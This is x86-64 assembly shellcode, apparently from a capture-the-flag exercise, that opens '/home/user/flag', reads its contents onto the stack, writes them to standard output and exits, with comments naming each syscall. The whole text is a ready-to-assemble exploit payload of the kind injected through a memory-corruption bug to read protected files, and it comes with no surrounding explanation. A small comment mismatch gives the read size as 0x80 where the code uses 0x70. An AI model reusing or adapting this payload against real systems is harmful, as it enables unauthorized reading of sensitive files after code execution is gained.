BITS 64
jmp main
flag:
    db '/home/user/flag',0
main:
    ; open("/home/user/flag", O_RDONLY)
    push 0x2
    pop rax
    lea rdi, [rel flag]
    xor esi, esi
    syscall
    ; read(fd, buff, 0x80)
    xchg rax, rdi
    xor eax, eax
    push rsp
    pop rsi
    push 0x70
    pop rdx
    syscall
    ; write(1, buff, r_num)
    xchg rax, rdx
    push 0x1
    pop rax
    push 0x1
    pop rdi
    push rsp
    pop rsi
    syscall
    xor rdi, rdi
    push 0x3c
    pop rax
    syscall
